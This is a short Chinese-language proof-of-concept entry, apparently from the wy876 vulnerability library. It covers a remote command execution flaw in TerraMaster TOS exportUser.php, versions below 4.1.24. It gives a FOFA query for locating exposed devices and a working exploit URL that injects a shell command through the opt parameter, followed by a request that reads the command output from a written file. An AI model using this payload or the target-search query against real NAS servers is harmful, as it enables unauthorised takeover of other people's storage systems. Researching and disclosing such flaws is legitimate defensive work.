---
fofa: "TerraMaster"
source: "wy876 漏洞文库"
---

# TerraMaster TOS exportUser.php 远程命令执行

# 一、漏洞简介
TerramasterTOS是中国深圳市图美电子技术（Terramaster）公司的一款基于Linux平台的，专用于erraMaster云存储NAS服务器的操作系统。TerramasterTOS系统 exportUser.php 存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。

# 二、影响版本
+ TerraMaster TOS < 4.1.24

# 三、资产测绘
+ fofa`"TerraMaster" && header="TOS"`
+ 特征


# 四、漏洞复现
```plain
/include/exportUser.php?type=3&cla=application&func=_exec&opt=(whoami)>test.txt
```


获取命令执行结果

```plain
/include/test.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/atopoc3573ymfsnt>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
